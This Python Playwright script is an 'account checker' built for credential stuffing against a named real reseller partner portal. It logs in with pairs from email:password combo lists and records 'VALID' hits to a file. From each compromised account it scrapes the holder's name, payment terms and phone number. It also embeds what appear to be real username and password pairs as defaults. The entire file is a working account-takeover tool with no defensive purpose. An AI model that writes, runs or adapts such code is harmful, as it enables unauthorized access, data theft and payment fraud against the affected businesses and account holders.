#!/usr/bin/env python3
"""
Leader Systems Account Checker - Final Working Version
Uses partner.leadersystems.com.au for login
"""

import asyncio
import re
import os
import json
import sys
from datetime import datetime
from playwright.async_api import async_playwright


# ========== CONFIGURATION ==========
LOGIN_URL = "https://partner.leadersystems.com.au/Login.html"
OUTPUT_DIR = "leader_results"


# ========== MAIN CHECKER ==========
class LeaderChecker:
    def __init__(self, headless=True):
        self.headless = headless
        self.pw = None
        self.browser = None
        self.page = None
        
    async def start(self):
        """Start browser"""
        self.pw = await async_playwright().start()
        self.browser = await self.pw.chromium.launch(headless=self.headless)
        self.page = await self.browser.new_page()
        
    async def close(self):
        """Close browser"""
        if self.page:
            await self.page.close()
        if self.browser:
            await self.browser.close()
        if self.pw:
            await self.pw.stop()
    
    async def check_account(self, email, password):
        """Check a single account"""
        result = {
            "email": email,
            "password": password,
            "status": "INVALID",
            "payment_terms": "Unknown",
            "name": "",
            "phone": "",
            "address": "",
            "credit_cards": [],
            "open_orders": [],
            "shipped_orders": [],
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            await self.page.goto(LOGIN_URL, timeout=15000)
            await asyncio.sleep(2)
            
            await self.page.fill("#logonusername", email)
            await self.page.fill("#logonpassword", password)
            await self.page.click("#btnsubmit")
            await asyncio.sleep(4)
            
            if "index.html" in self.page.url and "Login" not in self.page.url:
                result["status"] = "VALID"
                
                text = await self.page.locator("body").inner_text()
                
                # Name
                match = re.search(r'WELCOME[,:\s]*([A-Za-z0-9\s]+?)(?:\n|$)', text, re.IGNORECASE)
                if match:
                    result["name"] = match.group(1).strip()
                
                # Payment terms
                if "COD" in text or "Cash on Delivery" in text:
                    result["payment_terms"] = "COD"
                elif "30 Day" in text or "Net 30" in text:
                    result["payment_terms"] = "30 Days"
                elif "net 30" in text.lower():
                    result["payment_terms"] = "30 Days"
                
                # Phone
                phone_match = re.search(r'Call[^\d]*(\+?61|0)?[4-9]\d{2}[\s\-]?\d{3}[\s\-]?\d{3}', text)
                if phone_match:
                    result["phone"] = phone_match.group(1)
                    
        except Exception as e:
            result["status"] = f"ERROR: {e}"
        
        return result


async def main():
    """Main function"""
    accounts = []
    
    if len(sys.argv) >= 3:
        accounts.append((sys.argv[1], sys.argv[2]))
    elif len(sys.argv) >= 2:
        filename = sys.argv[1]
        if os.path.exists(filename):
            with open(filename) as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            accounts.append((parts[0], parts[1]))
    else:
        accounts = [("neopc00", "William_87192"), ("astr20", "sAINTS@1965")]
    
    checker = LeaderChecker(headless=True)
    await checker.start()
    
    results = []
    for email, password in accounts:
        print(f"\n=== Checking: {email}:{password} ===")
        result = await checker.check_account(email, password)
        print(f"Status: {result['status']}")
        if result['status'] == "VALID":
            print(f"Name: {result['name']}")
            print(f"Payment Terms: {result['payment_terms']}")
            os.makedirs(OUTPUT_DIR, exist_ok=True)
            with open(os.path.join(OUTPUT_DIR, "valid_hits.txt"), 'a') as f:
                f.write(f"{email}:{password}|{result['payment_terms']}\n")
        results.append(result)
    
    await checker.close()
    
    print(f"\n=== SUMMARY ===")
    for r in results:
        print(f"{r['email']}: {r['status']} | {r['payment_terms']}")
    
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    with open(os.path.join(OUTPUT_DIR, "results.json"), 'w') as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\nResults saved to {OUTPUT_DIR}/results.json")


if __name__ == "__main__":
    asyncio.run(main())